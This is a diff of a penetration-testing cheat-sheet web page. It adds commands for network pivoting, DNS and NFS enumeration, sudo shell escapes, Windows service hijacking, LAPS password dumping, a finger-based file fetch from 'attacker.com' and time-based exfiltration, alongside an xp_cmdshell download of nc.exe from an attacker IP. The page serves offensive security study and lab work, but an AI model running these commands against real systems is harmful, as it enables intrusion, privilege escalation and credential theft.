@@ -46,7 +46,7 @@
 <meta property="og:image:height" content="1024">
 
 
-  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+  <meta property="article:published_time" content="2022-07-18 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -162,7 +162,7 @@
   <div class="post-meta">
     
       <span class="post-date">
-        2022-07-10 
+        2022-07-18 
       </span>
     
     
@@ -293,7 +293,7 @@
 <td>Capture 50 DNS packets and print timestamp (use backticks not &lsquo;)</td>
 </tr>
 <tr>
-<td><code>xwd -display &lt;ip&gt;</code>:) -root -out /tmp/test.xpm</td>
+<td><code>xwd -display &lt;ip&gt;:) -root -out /tmp/test.xpm</code></td>
 <td>Capture remote X11 Windows and convert to JPG</td>
 </tr>
 <tr>
@@ -314,7 +314,7 @@
 </tr>
 <tr>
 <td><code>iptables -L -v --line-numbers</code></td>
-<td>LIst all iptables rules with line numbers</td>
+<td>List all iptables rules with line numbers</td>
 </tr>
 <tr>
 <td><code>iptables -F</code></td>
@@ -322,7 +322,7 @@
 </tr>
 <tr>
 <td><code>iptables -P &lt;INPUT/FORWARD/OUTPUT&gt; &lt;ACCEPT/REJECT/DROP&gt;</code></td>
-<td>CHange default policy for rules that don&rsquo;t match the rules</td>
+<td>Change default policy for rules that don&rsquo;t match the rules</td>
 </tr>
 <tr>
 <td><code>iptables -A output -o &lt;iface&gt; -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</code></td>
@@ -333,20 +333,12 @@
 <td>Allow SSH on port 22 OUTBOUND</td>
 </tr>
 <tr>
-<td><code>dig -x &lt;IP&gt;</code></td>
-<td>Domain lookup</td>
-</tr>
-<tr>
-<td><code>dig axfr example.com @ns1.example.com </code></td>
-<td>DNS Zone transfer</td>
+<td><code>iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d &lt;pivotip&gt; --dport 443 -to-destination &lt;attack_ip&gt;:443</code></td>
+<td>All 3 below are needed for port forwarding</td>
 </tr>
 <tr>
 <td><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code></td>
 <td>turn on ip forwarding</td>
-</tr>
-<tr>
-<td><code>iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d &lt;pivotip&gt; --dport 443 -to-destination &lt;attack_ip&gt;:443</code></td>
-<td>All 3 below needed for port forwarding</td>
 </tr>
 <tr>
 <td><code>iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s &lt;target subnet cidr&gt; -d &lt;attackip&gt; --dport 443 -to-source</code></td>
@@ -355,6 +347,54 @@
 <tr>
 <td><code>iptables -t filter -I FORWARD 1 -j ACCEPT</code></td>
 <td></td>
+</tr>
+<tr>
+<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box1&amp;2&gt; -o &lt;interface-between-box2&amp;3&gt; -j ACCEPT</code></td>
+<td>Forward traffic coming from interface 1 through interface 2</td>
+</tr>
+<tr>
+<td><code>sudo iptables -A FORWARD -i &lt;interface-between-box2&amp;3&gt; -o &lt;interface-between-box1&amp;2&gt; -m state --state ESTABLISHED,RELATE -j ACCEPT</code></td>
+<td>Forward traffic coming from interface 2 through to interface 1</td>
+</tr>
+<tr>
+<td><code>sudo iptables -t nat -A POSTROUTING -o &lt;interface-between-box2&amp;3&gt; -j MASQUERADE</code></td>
+<td>Masquerade source IP in TCP packets (for getting internet connection through a machine that has internet access)</td>
+</tr>
+<tr>
+<td><code>dig -x &lt;IP&gt;</code></td>
+<td>Domain lookup</td>
+</tr>
+<tr>
+<td><code>dig axfr example.com @ns1.example.com </code></td>
+<td>DNS Zone transfer</td>
+</tr>
+<tr>
+<td><code>dig &lt;domain&gt; AAAA</code></td>
+<td>IPv6 address of domain</td>
+</tr>
+<tr>
+<td><code>dig &lt;domain&gt; MX</code></td>
+<td>Mail records</td>
+</tr>
+<tr>
+<td><code>dig &lt;domain&gt; soa</code></td>
+<td>SOA records/ emergency email in second column</td>
+</tr>
+<tr>
+<td><code>dig &lt;domain&gt; ns</code></td>
+<td>Name servers</td>
+</tr>
+<tr>
+<td><code>dig &lt;domain&gt; txt</code></td>
+<td>TXT records</td>
+</tr>
+<tr>
+<td><code>dig @nserver_kerberos.tcp.fqdn SRV +short</code></td>
+<td>Discover domain controllers</td>
+</tr>
+<tr>
+<td><code>ssh -R &lt;anyPort&gt;:localhost:22 username@target</code> Then <code>ssh username@localhost -p&lt;port&gt;</code></td>
+<td>Reverse Reverse port forward (Allows you to ssh out of a machine that is blocked from external ssh access)</td>
 </tr>
 <tr>
 <td><code>echo &quot;nameserver x.x.x.x &gt; /etc/resolv.conf&quot;</code></td>
@@ -383,6 +423,14 @@
 <tr>
 <td><code>mount -o nolock -t nfs -o proto=tcp,port=2049 172.16.1.1:/ /mnt</code></td>
 <td>mount nfs share</td>
+</tr>
+<tr>
+<td><code>sudo mount -o vers=3 192.168.22.100:/home/user2 ./user2 </code></td>
+<td>Change NFS version, version4 obfuscates userIDs and GIDs</td>
+</tr>
+<tr>
+<td><code>sudo usermod -u &lt;UID&gt; &lt;username&gt;</code></td>
+<td>change UID of user to be able to read nfs files</td>
 </tr>
 <tr>
 <td><code>mount -t cifs -o username=&lt;user&gt;,password=&lt;password&gt;,domain=example.com //WIN_PC_IP/&lt;share name&gt; /mnt/windows</code></td>
@@ -533,6 +581,14 @@
 <td>Remote shell on system</td>
 </tr>
 <tr>
+<td><code>rsh &lt;IP&gt; &lt;Command&gt;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>rsh &lt;IP&gt; -l domain\user &lt;Command&gt;</code></td>
+<td></td>
+</tr>
+<tr>
 <td><code>rcp file.txt &lt;ip&gt;:/path/to/file.txt</code></td>
 <td></td>
 </tr>
@@ -569,7 +625,50 @@
 <td>Log keystrokes though vulnerable X11 service</td>
 </tr>
 <tr>
+<td><code>sudo ifconfig &lt;interface&gt; mtu 1200</code></td>
+<td>Fix ssh hanging issue</td>
+</tr>
+<tr>
+<td><code>rdesktop &lt;ip&gt;</code></td>
+<td>RDP option</td>
+</tr>
+<tr>
+<td><code>xfreerdp /v:&lt;ip&gt; /u:&lt;username&gt;</code></td>
+<td>RDP when rdesktop doesn&rsquo;t work</td>
+</tr>
+<tr>
+<td><code>remmina</code></td>
+<td>RDP option</td>
+</tr>
+</tbody>
+</table>
+<h2 id="linux-exploits">Linux exploits<a href="#linux-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>finger:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">RHOST<span style="color:#f92672">=</span>attacker.com
+LFILE<span style="color:#f92672">=</span>file_to_save
+finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<span style="color:#e6db74">&#34;</span>
+</code></pre></div><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo find . -exec /bin/sh \; -quit</code></td>
 <td></td>
+</tr>
+<tr>
+<td><code>sudo vim -c ':!/bin/sh'</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo base64 &quot;$LFILE&quot; | base64 --decode</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo mysql -e '\! /bin/sh'</code></td>
 <td></td>
 </tr>
 </tbody>
@@ -809,7 +908,7 @@
 <td>Port scan</td>
 </tr>
 <tr>
-<td><code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code></td>
+<td><code>sc query</code> <code>net start</code> <code>wmic service get name,startname</code> <code>Get-Service</code> OR <code>Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}</code></td>
 <td>List all services on the machine (good for finding a service for CLSIDs)</td>
 </tr>
 <tr>
@@ -836,6 +935,30 @@
 <td><code>Get-Printer</code></td>
 <td>Enumerate printers</td>
 </tr>
+<tr>
+<td><code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon</code></td>
+<td>auto logon credentials</td>
+</tr>
+<tr>
+<td><code>sc config &lt;service&gt; binpath=&quot;&lt;path of payload&gt;&quot;</code></td>
+<td>Exploit weak service permissions</td>
+</tr>
+<tr>
+<td><code>sc start/stop &lt;&gt;</code></td>
+<td>start/stop a service</td>
+</tr>
+<tr>
+<td><code>sc qc &lt;service&gt;</code></td>
+<td>Query service configuration/permissions</td>
+</tr>
+<tr>
+<td><code>icacls</code></td>
+<td>permissions of a file/ directory</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
 </tbody>
 </table>
 <h2 id="ldap-enumeration">LDAP enumeration<a href="#ldap-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -844,7 +967,7 @@
 server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;10.10.11.152&#39;</span>, port <span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>)
 connection <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, <span style="color:#e6db74">&#34;&lt;username&gt;&#34;</span>, <span style="color:#e6db74">&#34;&lt;password&gt;&#34;</span>) <span style="color:#75715e">#leave blank for null authentication</span>
 connection<span style="color:#f92672">.</span>bind()
-x <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=&lt;first part of domain name&gt;,DC=&lt;second part of domain name&gt;&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;ms-MCS-AdmPwd&#39;</span>,<span style="color:#e6db74">&#39;SAMAccountname&#39;</span>])
+x <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=timelapse,DC=htb&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;ms-MCS-AdmPwd&#39;</span>,<span style="color:#e6db74">&#39;SAMAccountname&#39;</span>])
 
 print(connection<span style="color:#f92672">.</span>entries)
 
@@ -1130,6 +1253,10 @@ print(server<span style="color:#f92672">.</span>info)
 </thead>
 <tbody>
 <tr>
+<td><code>sqlcmd -u &lt;user&gt; -p &lt;password&gt;</code></td>
+<td>Login to mssql locally in cmd</td>
+</tr>
+<tr>
 <td><code>'EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri &quot;http://192.168.22.2:8000/nc.exe&quot; -OutFile &quot;C:\windows\Temp\nc.exe&quot;'; --</code></td>
 <td>Command execution with xp_cmdshell (dir, type, ls etc do not work as stdout won&rsquo;t be displayed)</td>
 </tr>
@@ -1203,7 +1330,7 @@ print(server<span style="color:#f92672">.</span>info)
 </tbody>
 </table>
 <h3 id="connect-to-oracle-db">Connect to Oracle DB<a href="#connect-to-oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<h4 id="windows-1">Windows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<h4 id="windows-1">WIndows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <pre tabindex="0"><code>CONNECT username/password@&lt;IP&gt;:&lt;PORT&gt;
 </code></pre><h4 id="linux-1">Linux<a href="#linux-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export ORACLE_HOME<span style="color:#f92672">=</span>/path/to/oracle/home 			<span style="color:#75715e">#usually /usr/lib/oracle/&lt;version&gt;/client64/</span>
@@ -1318,8 +1445,8 @@ tnscmd10g version -h &lt;IP&gt;
 <td></td>
 </tr>
 <tr>
-<td>`time if [ $(whoami</td>
-<td>cut -c 1) == s ]; then sleep 5; fi`</td>
+<td><code>time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi</code></td>
+<td>time based data exfiltration  - THis payload will sleep for 5 ms if the name of the user starts with a s</td>
 </tr>
 <tr>
 <td><code>system('cat%20/etc/passwd')</code></td>
